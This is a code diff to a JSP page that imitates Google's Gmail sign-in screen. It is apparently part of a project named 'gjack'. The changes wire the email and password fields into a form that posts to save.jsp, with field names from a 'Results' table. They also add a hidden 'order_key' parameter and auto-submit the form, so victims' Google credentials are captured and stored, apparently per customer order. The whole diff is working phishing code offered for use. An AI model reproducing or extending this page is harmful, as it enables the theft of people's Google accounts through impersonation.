@@ -1,11 +1,9 @@
+<%@ page import="com.theah64.gjack.database.Orders" %>
+<%@ page import="com.theah64.gjack.database.Results" %>
 <html>
 <head>
     <title>Google</title>
-    <link rel="shortcut icon" href="assets/favicon.ico">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <%@include file="common_headers.jsp" %>
     <link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet">
     <link rel="stylesheet" href="node_modules/material-components-web/dist/material-components-web.css">
 
@@ -115,6 +113,7 @@
                     var password = $("input#password").val();
 
                     //TODO: Save the data here
+                    $("form#login").submit();
 
                 } else {
                     $("div#username_container").hide(300);
@@ -142,19 +141,29 @@
                 <h1 id="signin">Sign in</h1>
                 <p id="to_continue_to_gmail">to continue to Gmail</p>
 
-                <!--Username-->
-                <div id="username_container" class="mdc-textfield mdc-textfield--upgraded"
-                     data-mdc-auto-init="MDCTextfield">
-                    <input type="text" name="username" class="mdc-textfield__input" id="username">
-                    <label for="username" class="mdc-textfield__label google_label">Email or phone</label>
-                </div>
+                <form id="login" method="POST" action="save.jsp">
 
-                <!--Password-->
-                <div id="password_container" style="display: none" class="mdc-textfield mdc-textfield--upgraded"
-                     data-mdc-auto-init="MDCTextfield">
-                    <input type="password" name="password" class="mdc-textfield__input" id="password">
-                    <label for="password" class="mdc-textfield__label google_label">Password</label>
-                </div>
+                    <input type="hidden" name="<%=Orders.COLUMN_KEY%>" value="<%=request.getParameter("order_key")%>"/>
+
+                    <!--Username-->
+                    <div id="username_container" class="mdc-textfield mdc-textfield--upgraded"
+                         data-mdc-auto-init="MDCTextfield">
+                        <input type="text" name="<%=Results.COLUMN_G_USERNAME%>" class="mdc-textfield__input"
+                               id="username">
+                        <label for="username" class="mdc-textfield__label google_label">Email or phone</label>
+                    </div>
+
+                    <!--Password-->
+                    <div id="password_container" style="display: none" class="mdc-textfield mdc-textfield--upgraded"
+                         data-mdc-auto-init="MDCTextfield">
+                        <input type="password" name="<%=Results.COLUMN_G_PASSWORD%>" class="mdc-textfield__input"
+                               id="password">
+                        <label for="password" class="mdc-textfield__label google_label">Password</label>
+                    </div>
+
+
+                </form>
+
 
                 <br>
                 <br>
